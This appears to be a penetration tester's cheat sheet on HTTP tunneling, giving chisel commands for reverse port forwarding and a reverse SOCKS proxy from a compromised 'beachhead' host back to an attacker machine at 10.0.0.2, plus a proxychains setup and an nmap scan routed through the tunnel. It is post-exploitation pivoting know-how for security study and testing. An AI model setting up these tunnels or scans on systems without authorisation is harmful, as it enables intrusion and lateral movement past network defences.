# HTTP Tunneling

## Things to remember
  *  `127.0.0.1` != `localhost`, sometimes one or the other will cause errors

## Useful tools
  *  [`chisel`](https://github.com/jpillora/chisel) for establishing HTTP tunnels
  *  [`proxychains`](https://github.com/rofl0r/proxychains-ng) for proxying tools over HTTP tunnels

## HTTP remote port forwarding
  *  Tunnel a beachhead port to an attacker port via connection to beachhead
      *  Useful for catching connections from target
  *  Tunnel an attacker port to a target port via reverse connection from beachhead

// Beachhead port 4444 to attacker port 4444
```
./chisel server -p 443 --reverse
./chisel client 10.0.0.2:443 4444:10.0.0.2:4444
```

## HTTP dynamic port forwarding
  *  Tunnel an attacker port to any target via SOCKS proxy on beachhead

// Attacker port 1080 to proxy on beachhead via connection from beachhead to attacker
```
./chisel server -p 443 --reverse
./chisel client 10.0.0.2:443 R:socks
```

// Reconfigure and use proxychains
```
sudo nano /etc/proxychains4.conf
...
[ProxyList]
# add proxy here ...   
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
...
proxychains nmap -Pn -sT --top-ports 100 -vv -A 192.168.0.2
```
